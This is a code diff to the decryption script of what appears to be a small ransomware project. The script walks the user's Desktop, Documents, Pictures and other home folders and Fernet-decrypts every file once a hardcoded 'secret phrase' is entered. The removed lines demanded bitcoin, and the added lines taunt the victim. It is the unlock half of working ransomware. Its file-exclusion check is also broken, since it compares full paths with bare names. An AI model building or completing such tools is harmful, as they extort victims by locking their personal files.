@@ -1,37 +1,43 @@
-import os 
+import os
 from cryptography.fernet import Fernet
-# This file does the opposite of ENCRYPTING
 
-def decrypt_file(file_path, key):
-	with open(file_path, "rb") as thefile:
-		contents = thefile.read()
-	contents_decrypted = Fernet(key).decrypt(contents)
-	with open(file_path, "wb") as thefile:
-		thefile.write(contents_decrypted)
-
-# loading secret key
-with open("thekey.key","rb") as key_file:
-	key = key_file.read()
-
-secretphrase = "coffee"
-user_phrase = input("Enter the secret phrase to decrypt your files\n")
-
-
+# Define the list of directories to be traversed
 directories = ["Desktop", "Documents", "Music", "Videos", "Pictures", "Downloads"]
 
-if user_phrase == secretphrase:
-# this loop will go through each file in the files list and DECRYPT each one with the key	
-	for directory in directories:
-		for root, dirs, files in os.walk(directory):
-			for file in files:
-				# skipping files we dont want to decrypt
-				if file == 'encrypt.py' or file == 'decrypt.py' or file == 'thekey.key' or file == "dryrun.py" or file == "README.md":
-					continue
-				# getting file path
-				file_path = os.path.join(root, file)
-				# decryption
-				decrypt_file(file_path, key)
+# Initialize an empty list to store all the files in the specified directories
+files = []
 
-	print("Thanks sucka")
-else: 
-	print("WRONG!, SEND MORE BITCOIN")
+# Traverse each directory and subdirectory to get all files
+for directory in directories:
+    for root, _, filenames in os.walk(os.path.expanduser(f"~/{directory}")):
+        for filename in filenames:
+            files.append(os.path.join(root, filename))
+
+print(files)
+
+# Read the secret key from the file
+with open("thekey.key", "rb") as key_file:
+    secret_key = key_file.read()
+
+# Get the secret phrase
+secret_phrase = "coffee"
+
+# Ask for user input for the secret phrase
+user_phrase = input("Enter the secret phrase to decrypt your files\n")
+
+forbidden_files = ["README.md", "decrypt.py", "dryrun.py", "encrypt.py", "old_decrypt.py", "voldemort.py", "thekey.key"]
+
+# If the user input matches the secret phrase, perform decryption
+if user_phrase == secret_phrase:
+    # Loop through each file in the list and decrypt using the key
+    for file in files:
+        if file in forbidden_files:
+            continue
+        with open(file, "rb") as file_to_decrypt:
+            encrypted_content = file_to_decrypt.read()
+        decrypted_content = Fernet(secret_key).decrypt(encrypted_content)
+        with open(file, "wb") as decrypted_file:
+            decrypted_file.write(decrypted_content)
+    print("Retrieve your filthy dark secrets!")
+else:
+    print("Try again fool!")
